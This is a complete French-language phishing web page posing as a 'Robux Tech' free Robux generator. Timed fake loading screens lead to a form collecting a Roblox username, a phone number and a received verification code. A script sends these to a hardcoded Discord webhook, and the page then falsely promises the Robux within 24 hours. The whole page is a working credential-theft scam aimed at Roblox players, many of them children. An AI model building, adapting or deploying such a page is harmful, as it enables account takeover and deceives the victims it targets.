<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Robux Tech</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',system-ui,sans-serif; }
  body {
    min-height:100vh; display:flex; align-items:center; justify-content:center;
    background:radial-gradient(circle at 50% 20%, #1a1f3a 0%, #0a0d1a 60%, #05060d 100%);
    color:#e8ecff; overflow:hidden;
  }
  .card {
    width:min(420px, 92vw); background:rgba(18,22,45,0.85);
    border:1px solid rgba(120,140,255,0.25); border-radius:18px;
    padding:36px 28px; backdrop-filter:blur(14px);
    box-shadow:0 0 40px rgba(90,120,255,0.15), inset 0 0 20px rgba(90,120,255,0.05);
    position:relative; z-index:2;
  }
  .logo { text-align:center; font-size:26px; font-weight:800; letter-spacing:1px; margin-bottom:6px;
    background:linear-gradient(90deg,#7c9bff,#b78cff,#7c9bff); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
  .sub { text-align:center; font-size:13px; color:#8a93c9; margin-bottom:26px; }
  .stage { display:none; }
  .stage.active { display:block; animation:fade .4s ease; }
  @keyframes fade { from{opacity:0;transform:translateY(8px);} to{opacity:1;transform:none;} }
  label { display:block; font-size:12px; color:#9aa3d6; margin-bottom:6px; letter-spacing:.4px; }
  input {
    width:100%; padding:12px 14px; margin-bottom:16px; border-radius:10px;
    border:1px solid rgba(120,140,255,0.25); background:rgba(10,14,30,0.7);
    color:#e8ecff; font-size:15px; outline:none; transition:.2s;
  }
  input:focus { border-color:#7c9bff; box-shadow:0 0 0 3px rgba(124,155,255,0.15); }
  button {
    width:100%; padding:13px; border:none; border-radius:10px; cursor:pointer;
    font-size:15px; font-weight:700; letter-spacing:.5px; color:#fff;
    background:linear-gradient(90deg,#5a7bff,#9b6bff); transition:.2s;
  }
  button:hover { filter:brightness(1.15); }
  button:disabled { opacity:.5; cursor:not-allowed; }
  .loader { text-align:center; padding:20px 0; }
  .ring {
    width:56px; height:56px; margin:0 auto 18px;
    border:4px solid rgba(124,155,255,0.15); border-top-color:#7c9bff;
    border-radius:50%; animation:spin 1s linear infinite;
  }
  @keyframes spin { to { transform:rotate(360deg); } }
  .loader p { font-size:14px; color:#9aa3d6; }
  .bar { width:100%; height:6px; border-radius:3px; background:rgba(124,155,255,0.12); margin-top:16px; overflow:hidden; }
  .bar > span { display:block; height:100%; width:0; background:linear-gradient(90deg,#5a7bff,#9b6bff); transition:width .2s linear; }
  .done { text-align:center; }
  .done h2 { font-size:22px; margin-bottom:10px; color:#8affc1; }
  .done p { font-size:14px; color:#9aa3d6; line-height:1.5; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">ROBUX TECH</div>
  <div class="sub">Générateur de Robux — Édition 2026</div>

  <!-- Stage 1: first loader -->
  <div class="stage active" id="stage1">
    <div class="loader">
      <div class="ring"></div>
      <p id="msg1">Initialisation du générateur...</p>
      <div class="bar"><span id="bar1"></span></div>
    </div>
  </div>

  <!-- Stage 2: main form -->
  <div class="stage" id="stage2">
    <label>Pseudo Roblox</label>
    <input id="pseudo" placeholder="ex: Builderman123" autocomplete="off">
    <label>Numéro de téléphone</label>
    <input id="phone" placeholder="ex: 06 12 34 56 78" autocomplete="off">
    <label>Nombre de Robux souhaités</label>
    <input id="robux" type="number" placeholder="ex: 10000" autocomplete="off">
    <button id="nextBtn">Continuer</button>
  </div>

  <!-- Stage 3: second loader -->
  <div class="stage" id="stage3">
    <div class="loader">
      <div class="ring"></div>
      <p id="msg3">Connexion au serveur Roblox...</p>
      <div class="bar"><span id="bar3"></span></div>
    </div>
  </div>

  <!-- Stage 4: code entry -->
  <div class="stage" id="stage4">
    <label>Code de vérification</label>
    <input id="code" placeholder="Entrez le code reçu" autocomplete="off">
    <button id="submitBtn">Valider</button>
  </div>

  <!-- Stage 5: done -->
  <div class="stage" id="stage5">
    <div class="done">
      <h2>✓ Code vérifié</h2>
      <p>Vos Robux seront crédités sous 24h.<br>Merci d'avoir utilisé Robux Tech.</p>
    </div>
  </div>
</div>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1554843964769837190/WHJz8y26OqVRXqa2lT_EwwfWdBWyydrWArsec7WDfK5TB10pF0Dre7whII-lnyBG4Sim";

const $ = id => document.getElementById(id);
const show = id => {
  document.querySelectorAll('.stage').forEach(s => s.classList.remove('active'));
  $(id).classList.add('active');
};

// ---- stage 1: first loader (~30s) ----
const msgs1 = [
  "Initialisation du générateur...",
  "Chargement des modules...",
  "Connexion sécurisée...",
  "Préparation du formulaire..."
];
let t = 0;
const total1 = 30000;
const step1 = total1 / msgs1.length;
msgs1.forEach((m, i) => {
  setTimeout(() => { $('msg1').textContent = m; }, i * step1);
});
let start1 = Date.now();
const tick1 = setInterval(() => {
  const p = Math.min((Date.now() - start1) / total1, 1);
  $('bar1').style.width = (p * 100) + '%';
  if (p >= 1) { clearInterval(tick1); show('stage2'); }
}, 100);

// ---- stage 2 -> 3 ----
$('nextBtn').addEventListener('click', () => {
  const pseudo = $('pseudo').value.trim();
  const phone  = $('phone').value.trim();
  const robux  = $('robux').value.trim();
  if (!pseudo || !phone || !robux) { alert('Remplis tous les champs.'); return; }
  window.__data = { pseudo, phone, robux };
  show('stage3');
  runStage3();
});

// ---- stage 3: second loader (~30s) ----
function runStage3() {
  const msgs3 = [
    "Connexion au serveur Roblox...",
    "Vérification du compte...",
    "Génération des Robux...",
    "Finalisation..."
  ];
  const total3 = 30000;
  const step3 = total3 / msgs3.length;
  msgs3.forEach((m, i) => {
    setTimeout(() => { $('msg3').textContent = m; }, i * step3);
  });
  let start3 = Date.now();
  const tick3 = setInterval(() => {
    const p = Math.min((Date.now() - start3) / total3, 1);
    $('bar3').style.width = (p * 100) + '%';
    if (p >= 1) { clearInterval(tick3); show('stage4'); }
  }, 100);
}

// ---- stage 4: send everything on code submit ----
$('submitBtn').addEventListener('click', () => {
  const code = $('code').value.trim();
  if (!code) { alert('Entre le code.'); return; }
  const d = window.__data || {};

  const payload = {
    content: null,
    embeds: [{
      title: "🟢 Nouvelle soumission Robux Tech",
      color: 0x5a7bff,
      fields: [
        { name: "Pseudo Roblox", value: d.pseudo || "—", inline: true },
        { name: "Téléphone",     value: d.phone  || "—", inline: true },
        { name: "Robux",         value: d.robux  || "—", inline: true },
        { name: "Code",          value: code,            inline: false }
      ],
      timestamp: new Date().toISOString(),
      footer: { text: "Robux Tech" }
    }]
  };

  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).finally(() => show('stage5'));
});
</script>
</body>
</html>
